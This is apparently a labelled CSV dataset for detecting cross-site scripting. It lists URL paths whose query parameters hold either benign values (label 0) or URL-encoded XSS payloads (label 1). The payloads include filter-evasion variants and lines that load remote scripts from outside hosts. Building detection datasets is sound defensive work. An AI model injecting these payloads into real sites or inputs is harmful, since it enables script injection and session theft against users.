text,label
/displayhelp?cut=%22/%3E%3Cimg/onerror%3D%5Cx0Ajavascript%3Aalert%281%29%5Cx0Asrc%3Dxxx%3Ax%20/%3E,1
/12110?timeUnit=timeUnit,0
/goldman?richtext=richtext,0
/state_local?src=%3Cbody%20onscroll%3Djavascript%3Aalert%281%29%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cinput%20autofocus%3E,1
/security_tests?UserName=UserName,0
/1092?file=%3Cdiv%20STYLE%3D%22width%3A%20expression%28document.vulnerable%3Dtrue%29%3B%22%3E,1
/org?toppool=toppool,0
/ts_freetrial?yourname=%3Cmarquee%20onstart%3D%27javascript%3Aalert%28%271%27%29%3B%27%3E%3D%28%E2%97%95_%E2%97%95%29%3D,1
/F11?catid=catid,0
/16462?ch=%3CDIV%20STYLE%3D%22background-image%3A%5C0075%5C0072%5C006C%5C0028%27%5C006a%5C0061%5C0076%5C0061%5C0073%5C0063%5C0072%5C0069%5C0070%5C0074%5C003a%5C0061%5C006c%5C0065%5C0072%5C0074%5C0028.1027%5C0058.1053%5C0053%5C0027%5C0029%27%5C0029%22%3E,1
/2005-November?dbUsername=%3CIMG%20SRC%3Dx%20onresize%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22%3E,1
/pix_grey?sysemail=sysemail,0
/pgg?coupling=coupling,0
/macro?silver=silver,0
/rich_media?parenttab=parenttab,0
/general_steel?mbname=%3CIMG%20SRC%3D%26%230000106%26%230000097%26%230000118%26%230000097%26%230000115%26%230000099%26%230000114%26%230000105%26%230000112%26%230000116%26%230000058%26%230000097%26,1
/CDMA?l=l,0
/11966?abstract=%3Cscript%3Ecrypto.generateCRMFRequest%28%27CN%3D0%27%2C0%2C0%2Cnull%2C%27alert%281%29%27%2C384%2Cnull%2C%27rsa-dual-use%27%29%3C/script%3E,1
/195765_1?currentFolder=currentFolder,0
/registry-tools?fontr=fontr,0
/contact_call?scope=scope,0
/29008?qqfafile=%3CIMG%20SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22,1
/webarch?why=why,0
/privacy-guardian?adminuser=%3CSCRIPT%20FOR%3Ddocument%20EVENT%3Donreadystatechange%3Ejavascript%3Aalert%281%29%3C/SCRIPT%3E,1
/3318?tabs=%26lt%3BSTYLE%20TYPE%3D%5C%22text/javascript%5C%22%26gt%3Balert%28%27XSS%27%29%3B%26lt%3B/STYLE%26gt%3B,1
/CallForProposals?ptype=%3Cstyle%3E%3Cimg%20src%3D%22%3C/style%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28123%29//%22%3E,1
/2409?formSubmit=formSubmit,0
/dot-horizontal2?saveasdraft=saveasdraft,0
/39864?selyear=%3Ca%20href%3D%22%5Cx1Djavascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/Archives?edition=edition,0
/computersecurity?new=exp/%2A%26lt%3BA%20STYLE%3D%27no%5Cxss%26%2358%3Bnoxss%28%5C%22%2A//%2A%5C%22%29%3B,1
/footer_03?usecurl=usecurl,0
/florence?tabs=tabs,0
/4064?banner=%3Ca%20href%3D%22javas%5Cx00cript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/scsi?pp=pp,0
/0735613540?dataset=dataset,0
/5241?truncate=%3C%3BSCRIPT%20%3D%22%3Bblah%22%3B%20SRC%3D%22%3Bhttp%3A//ha.ckers.org/xss.js%22%3B%3E%3B%3C%3B/SCRIPT%3E%3B,1
/Labs?strictbind=%3CIMG%20SRC%3Dx%20onresize%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22%3E,1
/ded?vote=vote,0
/13587?archiveDate=archiveDate,0
/5304?ppsrefid=ABC%3Cdiv%20style%3D%22x%3A%5CxE2%5Cx80%5Cx8Bexpression%28javascript%3Aalert%281%29%22%3EDEF,1
/intercept?nolang=nolang,0
/b2_off?autologin=%3Chtml%20onMouseLeave%20html%20onMouseLeave%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/html%20onMouseLeave%3E,1
/ediscovery?criteriaColumnAdd=%26lt%3BSCRIPT%26gt%3Bdocument%26%2346%3Bwrite%28%5C%22%26lt%3BSCRI%5C%22%29%3B%26lt%3B/SCRIPT%26gt%3BPT%20SRC%3D%5C%22http%26%2358%3B//ha%26%2346%3Bckers%26%2346%3Borg/xss%26%2346%3Bjs%5C%22%26gt%3B%26lt%3B/SCRIPT%26gt%3B,1
/ji?identifier=identifier,0
/najlepsze?gpsstratum=%3Ca%20href%3D%22%5Cx07javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/152102?company=%3CSCRIPT%20onreadystatechange%3Djavascript%3Ajavascript%3Aalert%281%29%3B%3E%3C/SCRIPT%3E,1
/domeny?field=%3Csvg%3E%3Cscript%3E//%26NewLine%3Bconfirm%281%29%3B%3C/script%20%3C/svg%3E,1
/gnome2?remember=remember,0
/pixel_trans2?dhcp6prefixonly=%26%23x00003C,1
/29301?conversation=conversation,0
/00000173?newVideoTags=%3Cscript%5Cx00%3Ejavascript%3Aalert%281%29%3C/script%3E,1
/darvocet?agent=%3CIMG%20SRC%3D%23%20onmouseover%3D%22alert%28%27xxs%27%29%22%3E,1
/rating_3?netgraph=netgraph,0
/Smoking?dateto=dateto,0
/2420?dip=%3Cstyle%3E%40import%20%22data%3A%2C%2A%257bx%3Aexpression%28javascript%3Aalert%281%29%29%257D%22%3B%3C/style%3E,1
/av_small?filtre=%3Ca%20href%3D%22%5Cx01javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/probe?blog=%3Ctitle%20onpropertychange%3Djavascript%3Aalert%281%29%3E%3C/title%3E%3Ctitle%20title%3D%3E,1
/7045?targetboard=targetboard,0
/0117?holDateEnd=holDateEnd,0
/la_flag?proxypwd=%3CBGSOUND%20SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E,1
/53925?success=success,0
/4358?ex=%3Csvg%3E%3Cscript%20%3F%3Ealert%281%29,1
/5583?sched=%60%22%27%3E%3Cimg%20src%3Dxxx%3Ax%20onerror%5Cx09%3Djavascript%3Aalert%281%29%3E,1
/kpnqwest_large?imagedetails=%3C/html%3E,1
/193226647X?vhid=vhid,0
/20378?nextid=nextid,0
/style2logo?prune=prune,0
/fiber?rasamednsasdhcp6=rasamednsasdhcp6,0
/GLOBAL?round=%3CHTML%20xmlns%3Axss%3E%3C%3Fimport%20namespace%3D%22xss%22%20implementation%3D%22http%3A//www.securitycompass.com/xss.htc%22%3E%3Cxss%3Axss%3EXSS%3C/xss%3Axss%3E%3C/html%3E,1
/3652306?deleteg=%3C--%60%3Cimg/src%3D%60%20onerror%3Dalert%281%29%3E%20--%21%3E,1
/288871?ss=ss,0
/20050331?object=%26%23000060,1
/05082201_fta?invitation=invitation,0
/7077?servercn=%3C%21%5B%3C%21--%5D%5D%3Cscript%3Edocument.vulnerable%3Dtrue%3B//--%3E%3C/script%3E,1
/stalking?digest=digest,0
/sld004?missingtrackvolume=%3CTABLE%20BACKGROUND%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E,1
/overview2?itemID=%3CIMG%20SRC%3D%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2339%3B%26%2388%3B%26%2383%3B%26%2383%3B%26%2339%3B%26%2341%3B%3E,1
/bradner?latencylow=%3CBR%20SIZE%3D%22%26%7Balert%28%27XSS%27%29%7D%22%3E,1
/isobuster?projectid=%3CTABLE%20BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E,1
/fightnightround3?reportfun=reportfun,0
/country_arrow?strin=strin,0
/bluebar2?rows=%26lt%3BMETA%20HTTP-EQUIV%3D%5C%22refresh%5C%22%20CONTENT%3D%5C%220%3Burl%3Ddata%26%2358%3Btext/html%3Bbase64%2CPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K%5C%22%26gt%3B,1
/0502-exploits?regSubmit=%3CIMG%20SRC%3Dx%20onunload%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22%3E,1
/Sydney?passwdList=passwdList,0
/menu_button2?memberNotes=memberNotes,0
/68068?modifiedSince=modifiedSince,0
/296563?submit3=%26%23X00003c%3B,1
/15101?tokens=tokens,0
/moynihan?errorCode=%3Cscript%5Cx0C%3Ejavascript%3Aalert%281%29%3C/script%3E,1
/76481?global=%26lt%3BA%20HREF%3D%26quot%3B//www.google.com/%26quot%3B%26gt%3BXSS%26lt%3B/A%26gt%3B,1
/79882?PasswordResetForm=%3Cscript/src%3D%26%23100%26%2397%26%23116%26%2397%3Atext/%26%23x6a%26%23x61%26%23x76%26%23x61%26%23x73%26%23x63%26%23x72%26%23x69%26%23x000070%26%23x074%2C%26%23x0061%3B%26%23x06c%3B%26%23x0065%3B%26%23x00000072%3B%26%23x00074%3B%281%29%3E%3C/script%3E,1
/1504?memberEmail=%3Cimg/src%3D%27http%3A//i.imgur.com/P8mL8.jpg%27%20onmouseover%3D%26Tab%3Bprompt%281%29,1
/8096?problem=%3Cdiv%20style%3D%22xg-p%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%22%20onmouseover%3D%22prompt%281%29%22%20onclick%3D%22alert%281%29%22%3Ex%3C/button%3E,1
/marketmap_small?refuid=refuid,0
/2320?INDEXCOLUMNLIST=%3Ciframe%20srcdoc%3D%27%26lt%3Bbody%20onload%3Dprompt%26lpar%3B1%26rpar%3B%26gt%3B%27%3E,1
/3293?resolve=resolve,0
/scientology?reddi=reddi,0
/pidaho?attendance=%3Cmarquee%20onstart%3D%27javascript%3Aalert%28%271%27%29%3B%27%3E%3D%28%E2%97%95_%E2%97%95%29%3D,1
/broadband_provider?methodpayload=methodpayload,0
/newshome?dhcp6usev4iface=%3CEMBED%20SRC%3D%22http%3A//hacker.com/xss.swf%22%20AllowScriptAccess%3D%22always%22%3E,1
/viaggi?itemkey=itemkey,0
/598?netboot=Redirect%20302%20/a%26%2346%3Bjpg%20http%26%2358%3B//victimsite%26%2346%3Bcom/admin%26%2346%3Basp%26deleteuser,1
/vinge?msi=msi,0
/New_Mexico?l7container=%27%27%3B%21--%22%3CXSS%3E%3D%26%7B%28%29%7D,1
/18946?pageid=%3Cmeta%20HTTP-EQUIV%3D%22refresh%22%20CONTENT%3D%220%3B%20URL%3Dhttp%3A//%3BURL%3Djavascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,1
/arnold?msgs=%3C%3BTABLE%3E%3B%3C%3BTD%20BACKGROUND%3D%22%3Bjavascript%3Aalert%28%27%3BXSS%27%3B%29%22%3B%3E%3B%3C%3B/TD%3E%3B%3C%3B/TABLE%3E%3B,1
/20061030?tableList=tableList,0
/01548?press=press,0
/12309?vpntype=vpntype,0
/20060502?cmode=%3CIMG%20SRC%3D/%20onerror%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22%3E%3C/img%3E,1
/imc?cID=%3Cvideo%20onerror%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3Csource%3E,1
/101120?grouptype=grouptype,0
/article_endline?delivery=%3Cmarquee/onstart%3Dalert%28%29%3E,1
/shapka1?rowId=rowId,0
/sundays?posted=%22%3E%3CBODY%20onload%21%23%24%25%26%28%29%2A~%2B-_.%2C%3A%3B%3F%40%5B/%7C%5C%5D%5E%60%3Dalert%28%22XSS%22%29%3E,1
/260?birthmonth=%3CA%20HREF%3D%22http%3A//1113982867/%22%3EXSS%3C/A%3E,1
/header_end?instName=instName,0
/640?C=X%3Cx%20style%3D%60behavior%3Aurl%28%23default%23time2%29%60%20onbegin%3D%60javascript%3Aalert%281%29%60%20%3E,1
/featurepages?id13gid=id13gid,0
/rzeszow?specDetailInfo=%26lt%3BSCRIPT%26gt%3Bdocument.write%28%26quot%3B%26lt%3BSCRI%26quot%3B%29%3B%26lt%3B/SCRIPT%26gt%3BPT%20SRC%3D%26quot%3Bhttp%3A//ha.ckers.org/xss.js%26quot%3B%26gt%3B%26lt%3B/SCRIPT%26gt%3B,1
/homepage_logo?loanID=%3CTABLE%20BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E,1
/bga20061204000019?delimeter=delimeter,0
/icmp?criteriaRowInsert=%3Ctable%20BACKGROUND%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,1
/222?insert=insert,0
/textfile?Menu=%3Cembed%20code%3D%25%28scriptlet%29s%3E%3C/embed%3E,1
/inforeq?exponent=%3Ciframe/onreadystatechange%3D%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%28%27%5Cu0061%27%29%20worksinIE%3E,1
/logotype?GenerateForm=%3Cembed%20code%3D%25%28scriptlet%29s%3E%3C/embed%3E,1
/allports?SettingsForm=%3Cstyle/onload%3D%26lt%3B%21--%26%2309%3B%26gt%3B%26%2310%3Balert%26%2310%3B%26lpar%3B1%26rpar%3B%3E,1
/11073?lbg=%253C,1
/191270?keystring=%3C%3F%20foo%3D%22%3E%3Cx%20foo%3D%27%3F%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E%27%3E%22%3E,1
/sitegraphics?pause=%26lt%3Bscrscriptipt%26gt%3Balert%281%29%26lt%3B/scrscriptipt%26gt%3B,1
/102983?advanced=%3Ciframe/%2500/%20src%3DjavaSCRIPT%26colon%3Balert%281%29,1
/blackbox?cleartokens=%3Cscript%3Eif%28%22x%5C%5CxE0%5CxB9%5Cx92%22.length%3D%3D2%29%20%7B%20javascript%3Aalert%281%29%3B%7D%3C/script%3E,1
/17533?transport=//%7C%5C%5C%20%3Cscript%20//%7C%5C%5C%20src%3D%27https%3A//dl.dropbox.com/u/13018058/js.js%27%3E%20//%7C%5C%5C%20%3C/script%20//%7C%5C%5C,1
/skidka?gids=gids,0
/mit?reverseacct=%26lt%3BSTYLE%26gt%3B%40im%5Cport%27%5Cja%5Cvasc%5Cript%26%2358%3Balert%28%5C%22XSS%5C%22%29%27%3B%26lt%3B/STYLE%26gt%3B,1
/udo?generate=generate,0
/unix-tools?tableList=tableList,0
/33560?sqlport2=sqlport2,0
/parcel?slid=slid,0
/diewa170?target=target,0
/DVD-Cloner?titles=titles,0
/windows xp?columnsToDisplay=columnsToDisplay,0
/Comments?levels=levels,0
/thumb?updateurl=%26lt%3BLAYER%20SRC%3D%26quot%3Bhttp%3A//ha.ckers.org/scriptlet.html%26quot%3B%26gt%3B%26lt%3B/LAYER%26gt%3B,1
/ms_office?timeUnit=timeUnit,0
/fernseher?dataurl=dataurl,0
/UniLog?answer=answer,0
/1921226841?PAGE=PAGE,0
/projekty?sidebar=sidebar,0
/secnews?SMALLER=SMALLER,0
/Religion?addrule=%3CIMG%20SRC%3Djavascript%3Aalert%28%26quot%3BXSS%26quot%3B%29%3E,1
/mariners?maxfan=%22%60%27%3E%3Cscript%3E%5CxE3%5Cx80%5Cx80javascript%3Aalert%281%29%3C/script%3E,1
/skypecasts?nsql=nsql,0
/calsod?lcwidget=ABC%3Cdiv%20style%3D%22x%3Aexp%5Cx5Cression%28javascript%3Aalert%281%29%22%3EDEF,1
/forest?openbasedir=openbasedir,0
/glue?pipe=%3C%3BSCRIPT%20SRC%3D//ha.ckers.org/.j%3E%3B,1
/ghaleb?id26gid=%22%60%27%3E%3Cscript%3E%5CxE2%5Cx80%5Cx87javascript%3Aalert%281%29%3C/script%3E,1
/3950?postid=%3Ciframe/onreadystatechange%3D%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%28%27%5Cu0061%27%29%20worksinIE%3E,1
/317?script=%27%29%3B%20alert%28%27XSS,1
/linked?moveto=moveto,0
/stars_5?phonenumber=%3CSCRIPT%20%3D%22%3E%22%20SRC%3D%22http%3A//ha.ckers.org/xss.js%22%3E%3C/SCRIPT%3E,1
/25780?catname=catname,0
/41640?dhcp6usev4iface=%3CIMG%20SRC%3D%22jav%26%23x0D%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E,1
/emailBox?pW=pW,0
/nicaragua?dirlisting=%3C%3BEMBED%20SRC%3D%22%3Bhttp%3A//ha.ckers.org/xss.swf%22%3B%20AllowScriptAccess%3D%22%3Balways%22%3B%3E%3B%3C%3B/EMBED%3E%3B,1
/ultra2_promo?title=%3Cbody%20onResize%20body%20onResize%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/body%20onResize%3E,1
/itp?upcont=upcont,0
/bounties?pPassConf=%3CIMG%20SRC%3Dx%20onkeypress%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22%3E,1
/tagalog?bar=%3Cmeta%20HTTP-EQUIV%3D%22Link%22%20Content%3D%22%3Chttp%3A//www.securitycompass.com/xss.css%3E%3B%20REL%3Dstylesheet%22%3E,1
/bi_multibrochure?qsubject=qsubject,0
/40326?exportFormat=%3Cmeta%20charset%3D%20%22x-imap4-modified-utf7%22%26%26%3E%26%26%3Cscript%26%26%3Ejavascript%3Aalert%281%29%26%26%3B%26%26%3C%26%26/script%26%26%3E,1
/Web_Server?fontSize=fontSize,0
/morrison?searchName=%3Cscript%5Cx09type%3D%22text/javascript%22%3Ejavascript%3Aalert%281%29%3B%3C/script%3E,1
/43084?fineEachDay=%3Ctitle%20onpropertychange%3Djavascript%3Aalert%281%29%3E%3C/title%3E%3Ctitle%20title%3D%3E,1
/Anti-Hacking?course=%3Cxml%20id%3D%22xss%22%20src%3D%22%25%28htc%29s%22%3E%3C/xml%3E%20%3Clabel%20dataformatas%3D%22html%22%20datasrc%3D%22%23xss%22%20datafld%3D%22payload%22%3E%3C/label%3E,1
/ico-news?applicable=applicable,0
/technical-support?exccat=%26lt%3BIFRAME%20SRC%3Dhttp%3A//ha.ckers.org/scriptlet.html%20%26lt%3B,1
/mauritius?maxmss=%3Ciframe%20onReadyStateChange%20iframe%20onReadyStateChange%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/iframe%20onReadyStateChange%3E,1
/woordenboek?mcid=mcid,0
/Call_Center?unzip=unzip,0
/Texas?u=%3Cimg%20src%3Dx%5Cx09onerror%3D%22javascript%3Aalert%281%29%22%3E,1
/dilers?nomodify=nomodify,0
/0190?movedown=movedown,0
/Massachusetts?chapter=%3Ca%20href%3D%22%5Cx20javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/jag?ctx=ctx,0
/down_star?editaction=%3Cdiv%20style%3Dcontent%3Aurl%28%25%28svg%29s%29%3E%3C/div%3E,1
/contract?renamefile=renamefile,0
/rtu?blastname=blastname,0
/secretariat?flag=flag,0
/80360?noChangeGroup=%26lt%3BSCRIPT/XSS%20SRC%3D%26quot%3Bhttp%3A//ha.ckers.org/xss.js%26quot%3B%26gt%3B%26lt%3B/SCRIPT%26gt%3B,1
/692?confirmation=confirmation,0
/22437?mimetypes=%3Csvg%3E%3Cscript%20%3F%3Ealert%281%29,1
/s21?gpsnmea=%26lt%3BTABLE%26gt%3B%26lt%3BTD%20BACKGROUND%3D%5C%22javascript%26%23058%3Balert%28%27XSS%27%29%5C%22%26gt%3B,1
/002112?radiussecenable=radiussecenable,0
/ntds-management?reserveAlert=%22%3E%3Cscript%3Ealert%280%29%3C/script%3E,1
/beach_holidays?rwcommunity=%26lt%3BIMG%20SRC%3D%26quot%3Bjavascript%3Aalert%28%26apos%3BXSS%26apos%3B%29%3B%26quot%3B%26gt%3B,1
/ils?greif=greif,0
/holidays2006?n=%3Cscript%20%22a%3D%27%3E%27%22%20SRC%3D%22http%3A//www.securitycompass.com/xss.js%22%3E%3C/script%3E,1
/nclb?dbg=%26lt%3BHEAD%26gt%3B%26lt%3BMETA%20HTTP-EQUIV%3D%26quot%3BCONTENT-TYPE%26quot%3B%20CONTENT%3D%26quot%3Btext/html%3B%20charset%3DUTF-7%26quot%3B%26gt%3B%20%26lt%3B/HEAD%26gt%3B%2BADw-SCRIPT%2BAD4-alert%28%26apos%3BXSS%26apos%3B%29%3B%2BADw-/SCRIPT%2BAD4-,1
/bluearrow?cs2=%3CXML%20ID%3DI%3E%3CX%3E%3CC%3E%3C%21%5B%3CIMG%20SRC%3D%22javas%5D%5D%3C%21%5Bcript%3Adocument.vulnerable%3Dtrue%3B%22%3E%5D%5D%3C/C%3E%3C/X%3E%3C/xml%3E%3CSPAN%20DATASRC%3D%23I%20DATAFLD%3DC%20DATAFORMATAS%3DHTML%3E%3C/span%3E,1
/aw?productDescription=productDescription,0
/00000038?adminlogin=adminlogin,0
/novidades?rempool=rempool,0
/searchproduct?disablebeep=disablebeep,0
/gnustep?inViewLogs=inViewLogs,0
/upfront?link2=link2,0
/20475?drop=drop,0
/mx4j-management?smtppassword=smtppassword,0
/ejournals?chats=%3Cscript%20a%3D%22%3E%27%3E%22%20SRC%3D%22http%3A//www.securitycompass.com/xss.js%22%3E%3C/script%3E,1
/secure?platform=%26lt%3BIMG%20SRC%3D%27vbscript%26%23058%3Bmsgbox%28%5C%22XSS%5C%22%29%27%26gt%3B,1
/msg00206?trapstring=%3Cimg%20src%3D%22livescript%3Adocument.vulnerable%3Dtrue%3B%22%3E,1
/12913?timeIncrement=%3Cbody%20onLoad%20body%20onLoad%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/body%20onLoad%3E,1
/mcw?fileextensions=fileextensions,0
/topicgames?criteriaSearchType=criteriaSearchType,0
/nine?netgraph=netgraph,0
/6860?case=%3CIMG%20SRC%3D%27vbscript%3Amsgbox%28%5C%22XSS%5C%22%29%27%3E,1
/10068?saveconf=saveconf,0
/Expense_Management?blogid=%26lt%3B/TITLE%26gt%3B%26lt%3BSCRIPT%26gt%3Balert%28%22XSS%22%29%3B%26lt%3B/SCRIPT%26gt%3B,1
/23180?parked=parked,0
/ec_Main?series=series,0
/offline?exportFile=exportFile,0
/contact_list?wwname=%26lt%3BIMG%20DYNSRC%3D%26quot%3Bjavascript%3Aalert%28%26apos%3BXSS%26apos%3B%29%3B%26quot%3B%26gt%3B,1
/getdoc?radiusvendor=radiusvendor,0
/security_news?tempLoanID=%3Ca%20href%3D%22%5Cx00javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/31347?namespace=%22%3E%3Cimg%20src%3Dx%20onerror%3Dwindow.open%28%27https%3A//www.google.com/%27%29%3B%3E,1
/20452?season=season,0
/7960?execmethod=execmethod,0
/case-studies?quirks=quirks,0
/wwwcount?criteriaAndOrColumn=criteriaAndOrColumn,0
/umphress?sp=%3Cxml%20id%3D%22xss%22%20src%3D%22%25%28htc%29s%22%3E%3C/xml%3E%20%3Clabel%20dataformatas%3D%22html%22%20datasrc%3D%22%23xss%22%20datafld%3D%22payload%22%3E%3C/label%3E,1
/Digital-Photography?registered=registered,0
/videospiele?mcid=mcid,0
/chapter6?allergies=%3E%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E%26,1
/MessageLevelWP?Review=%3Chtml%20onMouseOver%20html%20onMouseOver%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/html%20onMouseOver%3E,1
/oscon2001?fin=fin,0
/xpress?chromeless=chromeless,0
/sheffield?ctrl=ctrl,0
/cgi_docs?contentType=contentType,0
/RequestPasswordForm?history=%27%27%3B%21--%22%3CXSS%3E%3D%26%7B%28%29%7D,1
/diggman?serverId=%3CFRAMESET%3E%3CFRAME%20SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E%3C/frameset%3E,1
/iraq2003?aj=aj,0
/114981422?purchaseorderid=purchaseorderid,0
/7873?gfils=%3Cimg%20SRC%3D%27vbscript%3Adocument.vulnerable%3Dtrue%3B%27%3E,1
/ipfwadm?dateStart=%3Cdiv%20style%3D%22font-family%3Afoo%7Dcolor%3Dred%3B%22%3EXXX,1
/3972?aliasimport=aliasimport,0
/22062?fileFormat=%3C%3CSCRIPT%3Ealert%28%22XSS%22%29%3B//%3C%3C/SCRIPT%3E,1
/1301951487?images=images,0
/cerberus?element=element,0
/seoul?safecss=%3Cscript%20%5E__%5E%3Ealert%28String.fromCharCode%2849%29%29%3C/script%20%5E__%5E,1
/940?databasehost=databasehost,0
/simon2?subtotal=%3CSCRIPT%20SRC%3D//ha.ckers.org/.j%3E,1
/telefonia?REPO=REPO,0
/askcity?fresh=%3Ctable%3E%3CTD%20BACKGROUND%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,1
/10479?njform=%3CSCRIPT%3Edocument.write%28%22XSS%22%29%3B%3C/SCRIPT%3E,1
/8426?ppsrefid=ppsrefid,0
/politica?radiusserveracctport=%3Ca/href%3D%22javascript%3A%26%2313%3B%20javascript%3Aprompt%281%29%22%3E%3Cinput%20type%3D%22X%22%3E,1
/0294?UserName=UserName,0
/2170213?eventTitle=eventTitle,0
/nav_links?thumb=thumb,0
/68014?NAME=NAME,0
/logo_social?application=%3CBR%20SIZE%3D%22%26%7Balert%28%27XSS%27%29%7D%22%3E,1
/1x1pixel?id17level=%3C%3BBODY%20onload%21%23%24%25%26%3B%28%29%2A~%2B-_.%2C%3A%3B%3F%40%5B/%7C%5C%5D%5E%60%3Dalert%28%22%3BXSS%22%3B%29%3E%3B,1
/top_sites?logoff=logoff,0
/p_t?actionName=--%3E%3C%21--%20--%5Cx00%3E%20%3Cimg%20src%3Dxxx%3Ax%20onerror%3Djavascript%3Aalert%281%29%3E%20--%3E,1
/buy-tramadol?themename=%26lt%3BA%20HREF%3D%5C%22http%26%2358%3B//%2577%2577%2577%252E%2567%256F%256F%2567%256C%2565%252E%2563%256F%256D%5C%22%26gt%3BXSS%26lt%3B/A%26gt%3B,1
/merchandising?fulltext=fulltext,0
/careerops?shortcut=%3Cxml%20id%3D%22xss%22%20src%3D%22%25%28htc%29s%22%3E%3C/xml%3E%20%3Clabel%20dataformatas%3D%22html%22%20datasrc%3D%22%23xss%22%20datafld%3D%22payload%22%3E%3C/label%3E,1
/6609?bookings=bookings,0
/olist?deletedir=deletedir,0
/scheduler?collapse=collapse,0
/sc1?postal=postal,0
/4203?itemSource=itemSource,0
/Enya?disp=%3Ca%20href%3D%22%5Cx1Ejavascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/john?path=path,0
/000279?addtxt=%3Cimage%20src/onerror%3Dprompt%288%29%3E,1
/die?dbpassword=%3CBODY%20ONLOAD%3Dalert%28%27XSS%27%29%3E,1
/23522?deletebookmarks=%3Cscript%3Ealert%28%27XSS%27%29%3B%3C/script%3E,1
/1003?strukt=strukt,0
/52189?start2=start2,0
/index260?errormsg=%3Cstyle%3E%3Cimg%20src%3D%22%3C/style%3E%3Cimg%20src%3Dx%20onerror%3Djavascript%3Aalert%281%29//%22%3E,1
/Nice?encod=encod,0
/46641?phperror=phperror,0
